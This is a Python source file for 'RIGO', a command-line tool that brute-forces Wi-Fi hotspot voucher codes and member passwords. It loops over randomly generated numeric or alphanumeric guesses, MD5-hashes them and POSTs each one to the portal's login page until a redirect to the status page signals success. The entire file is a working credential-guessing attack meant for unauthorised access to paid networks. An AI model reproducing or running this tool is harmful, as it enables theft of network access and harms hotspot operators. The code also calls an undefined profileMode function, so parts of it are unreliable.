# Self Making with ❤ by Ubaii ID
# Thanks to : stackoverflow, My Family, Allah.

# IMPORT MODULE
import requests as req
import urllib.request as ul
import urllib.error as er
from urllib.parse import urlparse
import hashlib
import random,time,os,sys,configparser

# COLOR LIBRARY
class c:
	purple = '\033[95m'
	ob = '\033[94m'
	oc = '\033[96m'
	og = '\033[92m'
	warn = '\033[93m'
	error = '\033[91m'
	n = '\033[0m'
	BOLD = '\033[1m'
	UNDERLINE = '\033[4m'

def cls():
	command = 'clear'
	if os.name in ('nt', 'dos'):  # If Machine is running on Windows, use cls
		command = 'cls'
	os.system(command)

def validating(target):
	data = urlparse(target)
	path = data.path
	cek = data.scheme
	if cek == '':
		return False
	elif path == '':
		return False
	else:
		return True

def banner():
	cls()
	print(f'''{c.og}
		RIGO
 =-------------------------------=
 SIMPLE BRUTEFORCE VOUCHER HOTSPOT
 =-------------------------------={c.oc}
 Version : {c.n}FINAL STABLE RELEASE{c.oc}
 github.com/ubaii/rigo
 {c.n}''')

def mode():
	print(f'''{c.n}
	PLEASE SELECT MODE
 1. Username = Password Mode (voucher)
 2. Username & Password Mode (member)
 {c.n}''')

def typeE():
	print(f'''{c.n}
	PLEASE SELECT TYPE RANDOMIZATION
 1. Random Number (0-9)
 2. Random Selected Number
 3. Random Char with Random Number (a-Z & 0-9)
 4. Random Selected Char with Random Selected Number
 5. Back
 {c.n}''')

def typeB():
	print(f'''{c.n}
	PLEASE SELECT TYPE RANDOMIZATION PASSWORD
 1. Random Number (0-9)
 2. Random Selected Number
 3. Random Char with Random Number (a-Z & 0-9)
 4. Random Selected Char with Random Selected Number
 5. Back
 {c.n}''')

def redirectCheck(target):
	resp = ul.urlopen(target, timeout=2)
	if resp.geturl() == target+'login':
		return 'OK'
	elif resp.geturl() == target+'status':
		return 'DL'
	else:
		return resp.geturl()

def grand(totalDigit, randomValue):
	rand = ''
	for i in range(0,int(totalDigit)):
		rand+= random.choice(randomValue)
	return rand

def grandChar(maxLength1, maxLength2, whoFirst):
	randOne = ''
	randTwo = ''
	char = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'
	num = '0123456789'
	for i in range(0,int(maxLength1)):
		randOne+= random.choice(char)
	for i in range(0,int(maxLength2)):
		randTwo+= random.choice(num)
	if whoFirst == 'CHARNUM':
		return randOne+randTwo
	elif whoFirst == 'NUMCHAR':
		return randTwo+randOne
	else:
		exit()

def grandSChar(selectedChar, selectedNum, maxLength1, maxLength2, whoFirst):
	randOne = ''
	randTwo = ''
	for i in range(0,int(maxLength1)):
		randOne+= random.choice(selectedChar)
	for i in range(0,int(maxLength2)):
		randTwo+= random.choice(selectedNum)
	if whoFirst == 'CHARNUM':
		return randOne+randTwo
	elif whoFirst == 'NUMCHAR':
		return randTwo+randOne
	else:
		exit()

def startUspOne(target, mnl):
	target_validate = validating(target)
	targets = target+'login'
	if target_validate is True:
		target_status = ul.urlopen(target).getcode()
		url_alive = target_status == 200
		if url_alive is True:
			t_end = time.time() + 2 * int(10000)
			while time.time() < t_end:
				redirectValidate = redirectCheck(target)
				if redirectValidate == 'OK':
					value = '0123456789'
					rand = grand(mnl, value)
					awkoawko = hashlib.md5(rand.encode())
					passw = awkoawko.hexdigest()
					data = {'username': rand, 'password': passw, 'dst': '', 'popup': 'true'}
					req.post(targets, data = data)
					print(f' [{c.og}*{c.n}] trying -> [{rand}]')
				elif redirectValidate == 'DL':
					print(f' [{c.og}+{c.n}] Login was sucessfull.')
					exit()
				else:
					print(f' [{c.error}!{c.n}] Unable trying randomization')
					print(f' [{c.error}!{c.n}] Last page : {redirectValidate}')
					exit()
		elif url_alive is False:
			print(f' [{c.error}!{c.n}] Url {target} was not found.')
			print(f' [{c.error}!{c.n}] be sure u was connected on wifi target.')
	elif target_validate is False:
		print(f' [{c.error}!{c.n}] Url {target} not valid.')
		print(f' [{c.error}!{c.n}] be sure use http/https and use / on last.')
		exit()

def startUdpOne(target, mnl, user):
	target_validate = validating(target)
	targets = target+'login'
	if target_validate is True:
		target_status = ul.urlopen(target).getcode()
		url_alive = target_status == 200
		if url_alive is True:
			t_end = time.time() + 2 * int(10000)
			while time.time() < t_end:
				redirectValidate = redirectCheck(target)
				if redirectValidate == 'OK':
					value = '0123456789'
					rand = grand(mnl, value)
					awkoawko = hashlib.md5(rand.encode())
					passw = awkoawko.hexdigest()
					data = {'username': user, 'password': passw, 'dst': '', 'popup': 'true'}
					req.post(targets, data = data)
					print(f' [{c.og}*{c.n}] trying -> {user} & {rand}')
				elif redirectValidate == 'DL':
					print(f' [{c.og}+{c.n}] Login was sucessfull.')
					exit()
				else:
					print(f' [{c.error}!{c.n}] Unable trying randomization')
					print(f' [{c.error}!{c.n}] Last page : {redirectValidate}')
					exit()
		elif url_alive is False:
			print(f' [{c.error}!{c.n}] Url {target} was not found.')
			print(f' [{c.error}!{c.n}] be sure u was connected on wifi target.')
	elif target_validate is False:
		print(f' [{c.error}!{c.n}] Url {target} not valid.')
		print(f' [{c.error}!{c.n}] be sure use http/https and use / on last.')
		exit()

def startUspTwo(target, mnl, value):
	target_validate = validating(target)
	targets = target+'login'
	if target_validate is True:
		target_status = ul.urlopen(target).getcode()
		url_alive = target_status == 200
		if url_alive is True:
			t_end = time.time() + 2 * int(10000)
			while time.time() < t_end:
				redirectValidate = redirectCheck(target)
				if redirectValidate == 'OK':
					rand = grand(mnl, value)
					awkoawko = hashlib.md5(rand.encode())
					passw = awkoawko.hexdigest()
					data = {'username': rand, 'password': passw, 'dst': '', 'popup': 'true'}
					req.post(targets, data = data)
					print(f' [{c.og}*{c.n}] trying -> [{rand}]')
				elif redirectValidate == 'DL':
					print(f' [{c.og}+{c.n}] Login was sucessfull.')
					exit()
				else:
					print(f' [{c.error}!{c.n}] Unable trying randomization')
					print(f' [{c.error}!{c.n}] Last page : {redirectValidate}')
					exit()
		elif url_alive is False:
			print(f' [{c.error}!{c.n}] Url {target} was not found.')
			print(f' [{c.error}!{c.n}] be sure u was connected on wifi target.')
	elif target_validate is False:
		print(f' [{c.error}!{c.n}] Url {target} not valid.')
		print(f' [{c.error}!{c.n}] be sure use http/https and use / on last.')
		exit()

def startUdpTwo(target, mnl, value, user):
	target_validate = validating(target)
	targets = target+'login'
	if target_validate is True:
		target_status = ul.urlopen(target).getcode()
		url_alive = target_status == 200
		if url_alive is True:
			t_end = time.time() + 2 * int(10000)
			while time.time() < t_end:
				redirectValidate = redirectCheck(target)
				if redirectValidate == 'OK':
					rand = grand(mnl, value)
					awkoawko = hashlib.md5(rand.encode())
					passw = awkoawko.hexdigest()
					data = {'username': user, 'password': passw, 'dst': '', 'popup': 'true'}
					req.post(targets, data = data)
					print(f' [{c.og}*{c.n}] trying -> {user} & {rand}')
				elif redirectValidate == 'DL':
					print(f' [{c.og}+{c.n}] Login was sucessfull.')
					exit()
				else:
					print(f' [{c.error}!{c.n}] Unable trying randomization')
					print(f' [{c.error}!{c.n}] Last page : {redirectValidate}')
					exit()
		elif url_alive is False:
			print(f' [{c.error}!{c.n}] Url {target} was not found.')
			print(f' [{c.error}!{c.n}] be sure u was connected on wifi target.')
	elif target_validate is False:
		print(f' [{c.error}!{c.n}] Url {target} not valid.')
		print(f' [{c.error}!{c.n}] be sure use http/https and use / on last.')
		exit()

def startUspThree(target, maxRandLength1, maxRandLength2, whoFirst):
	target_validate = validating(target)
	targets = target+'login'
	if target_validate is True:
		target_status = ul.urlopen(target).getcode()
		url_alive = target_status == 200
		if url_alive is True:
			t_end = time.time() + 2 * int(10000)
			while time.time() < t_end:
				redirectValidate = redirectCheck(target)
				if redirectValidate == 'OK':
					rand = grandChar(maxRandLength1, maxRandLength2, whoFirst)
					awkoawko = hashlib.md5(rand.encode())
					passw = awkoawko.hexdigest()
					data = {'username': rand, 'password': passw, 'dst': '', 'popup': 'true'}
					req.post(targets, data = data)
					print(f' [{c.og}*{c.n}] trying -> [{rand}]')
				elif redirectValidate == 'DL':
					print(f' [{c.og}+{c.n}] Login was sucessfull.')
					exit()
				else:
					print(f' [{c.error}!{c.n}] Unable trying randomization')
					print(f' [{c.error}!{c.n}] Last page : {redirectValidate}')
					exit()
		elif url_alive is False:
			print(f' [{c.error}!{c.n}] Url {target} was not found.')
			print(f' [{c.error}!{c.n}] be sure u was connected on wifi target.')
	elif target_validate is False:
		print(f' [{c.error}!{c.n}] Url {target} not valid.')
		print(f' [{c.error}!{c.n}] be sure use http/https and use / on last.')
		exit()

def startUdpThree(target, maxRandLength1, maxRandLength2, whoFirst, user):
	target_validate = validating(target)
	targets = target+'login'
	if target_validate is True:
		target_status = ul.urlopen(target).getcode()
		url_alive = target_status == 200
		if url_alive is True:
			t_end = time.time() + 2 * int(10000)
			while time.time() < t_end:
				redirectValidate = redirectCheck(target)
				if redirectValidate == 'OK':
					rand = grandChar(maxRandLength1, maxRandLength2, whoFirst)
					awkoawko = hashlib.md5(rand.encode())
					passw = awkoawko.hexdigest()
					data = {'username': user, 'password': passw, 'dst': '', 'popup': 'true'}
					req.post(targets, data = data)
					print(f' [{c.og}*{c.n}] trying -> {user} & {rand}')
				elif redirectValidate == 'DL':
					print(f' [{c.og}+{c.n}] Login was sucessfull.')
					exit()
				else:
					print(f' [{c.error}!{c.n}] Unable trying randomization')
					print(f' [{c.error}!{c.n}] Last page : {redirectValidate}')
					exit()
		elif url_alive is False:
			print(f' [{c.error}!{c.n}] Url {target} was not found.')
			print(f' [{c.error}!{c.n}] be sure u was connected on wifi target.')
	elif target_validate is False:
		print(f' [{c.error}!{c.n}] Url {target} not valid.')
		print(f' [{c.error}!{c.n}] be sure use http/https and use / on last.')
		exit()

def startUspFour(target, selectedChar, selectedNum, maxRandLength1, maxRandLength2, whoFirst):
	target_validate = validating(target)
	targets = target+'login'
	if target_validate is True:
		target_status = ul.urlopen(target).getcode()
		url_alive = target_status == 200
		if url_alive is True:
			t_end = time.time() + 2 * int(10000)
			while time.time() < t_end:
				redirectValidate = redirectCheck(target)
				if redirectValidate == 'OK':
					rand = grandSChar(selectedChar, selectedNum, maxRandLength1, maxRandLength2, whoFirst)
					awkoawko = hashlib.md5(rand.encode())
					passw = awkoawko.hexdigest()
					data = {'username': rand, 'password': passw, 'dst': '', 'popup': 'true'}
					req.post(targets, data = data)
					print(f' [{c.og}*{c.n}] trying -> [{rand}]')
				elif redirectValidate == 'DL':
					print(f' [{c.og}+{c.n}] Login was sucessfull.')
					exit()
				else:
					print(f' [{c.error}!{c.n}] Unable trying randomization')
					print(f' [{c.error}!{c.n}] Last page : {redirectValidate}')
					exit()
		elif url_alive is False:
			print(f' [{c.error}!{c.n}] Url {target} was not found.')
			print(f' [{c.error}!{c.n}] be sure u was connected on wifi target.')
	elif target_validate is False:
		print(f' [{c.error}!{c.n}] Url {target} not valid.')
		print(f' [{c.error}!{c.n}] be sure use http/https and use / on last.')
		exit()

def startUdpFour(target, selectedChar, selectedNum, maxRandLength1, maxRandLength2, whoFirst, user):
	target_validate = validating(target)
	targets = target+'login'
	if target_validate is True:
		target_status = ul.urlopen(target).getcode()
		url_alive = target_status == 200
		if url_alive is True:
			t_end = time.time() + 2 * int(10000)
			while time.time() < t_end:
				redirectValidate = redirectCheck(target)
				if redirectValidate == 'OK':
					rand = grandSChar(selectedChar, selectedNum, maxRandLength1, maxRandLength2, whoFirst)
					awkoawko = hashlib.md5(rand.encode())
					passw = awkoawko.hexdigest()
					data = {'username': user, 'password': passw, 'dst': '', 'popup': 'true'}
					req.post(targets, data = data)
					print(f' [{c.og}*{c.n}] trying -> {user} & {rand}')
				elif redirectValidate == 'DL':
					print(f' [{c.og}+{c.n}] Login was sucessfull.')
					exit()
				else:
					print(f' [{c.error}!{c.n}] Unable trying randomization')
					print(f' [{c.error}!{c.n}] Last page : {redirectValidate}')
					exit()
		elif url_alive is False:
			print(f' [{c.error}!{c.n}] Url {target} was not found.')
			print(f' [{c.error}!{c.n}] be sure u was connected on wifi target.')
	elif target_validate is False:
		print(f' [{c.error}!{c.n}] Url {target} not valid.')
		print(f' [{c.error}!{c.n}] be sure use http/https and use / on last.')
		exit()

def index():
	banner()
	mode()
	selMode = input('Select Mode ~> ')
	if selMode == '1':
		banner()
		typeE()
		types = input('Select Type ~> ')
		if types == '1':
			targets = input('Target ~> ')
			maxNumLength = input('Max Num Length ~> ')
			startUspOne(targets, maxNumLength)
		elif types == '2':
			targets = input('Target ~> ')
			selectedNum = input('Selected Number ~> ')
			maxNumLength = input('Max Num Length ~> ')
			startUspTwo(targets, maxNumLength, selectedNum)
		elif types == '3':
			targets = input('Target ~> ')
			maxRandLength1 = input('Max Random Length Char ~> ')
			maxRandLength2 = input('Max Random Length Num ~> ')
			whoFirst = input('Who first? CHARNUM or NUMCHAR ~> ')
			if whoFirst == 'CHARNUM':
				condition = 'CHARNUM'
				startUspThree(targets, maxRandLength1, maxRandLength2, whoFirst)
			elif whoFirst == 'NUMCHAR':
				condition = 'NUMCHAR'
				startUspThree(targets, maxRandLength1, maxRandLength2, whoFirst)
			else:
				print(f' [{c.error}!{c.n}] Please type NUMCHAR or CHARNUM.')
				exit()
		elif types == '4':
			targets = input('Target ~> ')
			selectedChar = input('Selected Char ~> ')
			selectedNum = input('Selected Num ~> ')
			maxRandLength1 = input('Max Random Length Char ~> ')
			maxRandLength2 = input('Max Random Length Num ~> ')
			whoFirst = input('CHARNUM or NUMCHAR ~> ')
			if whoFirst == 'CHARNUM':
				condition = 'CHARNUM'
				startUspFour(targets, selectedChar, selectedNum, maxRandLength1, maxRandLength2, whoFirst)
			elif whoFirst == 'NUMCHAR':
				condition = 'NUMCHAR'
				startUspFour(targets, selectedChar, selectedNum, maxRandLength1, maxRandLength2, whoFirst)
			else:
				print(f' [{c.error}!{c.n}] Please type NUMCHAR or CHARNUM.')
				exit()
		elif types == '5':
			index()
		else:
			index()
	elif selMode == '2':
		user = input('Please type username ~>')
		banner()
		typeB()
		print(f'[{c.og}~{c.n}] LOCKED USERNAME : {user}')
		types = input('Select Type ~> ')
		if types == '1':
			targets = input('Target ~> ')
			maxNumLength = input('Max Num Length ~> ')
			startUdpOne(targets, maxNumLength, user)
		elif types == '2':
			targets = input('Target ~> ')
			selectedNum = input('Selected Number ~> ')
			maxNumLength = input('Max Num Length ~> ')
			startUdpTwo(targets, maxNumLength, selectedNum, user)
		elif types == '3':
			targets = input('Target ~> ')
			maxRandLength1 = input('Max Random Length Char ~> ')
			maxRandLength2 = input('Max Random Length Num ~> ')
			whoFirst = input('Who first? CHARNUM or NUMCHAR ~> ')
			if whoFirst == 'CHARNUM':
				condition = 'CHARNUM'
				startUdpThree(targets, maxRandLength1, maxRandLength2, whoFirst, user)
			elif whoFirst == 'NUMCHAR':
				condition = 'NUMCHAR'
				startUdpThree(targets, maxRandLength1, maxRandLength2, whoFirst, user)
			else:
				print(f' [{c.error}!{c.n}] Please type NUMCHAR or CHARNUM.')
				exit()
		elif types == '4':
			targets = input('Target ~> ')
			selectedChar = input('Selected Char ~> ')
			selectedNum = input('Selected Num ~> ')
			maxRandLength1 = input('Max Random Length Char ~> ')
			maxRandLength2 = input('Max Random Length Num ~> ')
			whoFirst = input('CHARNUM or NUMCHAR ~> ')
			if whoFirst == 'CHARNUM':
				condition = 'CHARNUM'
				startUdpFour(targets, selectedChar, selectedNum, maxRandLength1, maxRandLength2, whoFirst, user)
			elif whoFirst == 'NUMCHAR':
				condition = 'NUMCHAR'
				startUdpFour(targets, selectedChar, selectedNum, maxRandLength1, maxRandLength2, whoFirst, user)
			else:
				print(f' [{c.error}!{c.n}] Please type NUMCHAR or CHARNUM.')
				exit()
		elif types == '5':
			index()
		else:
			index()
	else:
		index()

if __name__ == "__main__":
	config = "core/config.ini" # ganti sesuai nama file nya bang :)
	try:
		read = configparser.ConfigParser()
		read.read(config)
		forceProfileMode = read['rigo']['forceProfileMode']
		if forceProfileMode == 'true':
			profileMode()
		else :
			index()
	except(KeyboardInterrupt):
		print(f' [{c.error}!{c.n}] force exit.')
	except(FileNotFoundError):
		print(f' [{c.error}!{c.n}] file {config} was not found!!')
	except(KeyError):
		print(f' [{c.error}!{c.n}] error key option on file {config}!!')
	except(SystemExit) as e:
		print(f' [{c.error}!{c.n}] Done.')
		print(f' [{c.error}!{c.n}] Error : {e}.')
	except(er.URLError) as e:
			print(f'\n [{c.error}!{c.n}] Failed to connect with target.')
			print(f' [{c.error}!{c.n}] Be sure u was connected on wifi target.')
	except(Exception) as e:
		print(f' [{c.error}!{c.n}] Error: {e}')
		print(f' [{c.error}!{c.n}] Unexpected error.')
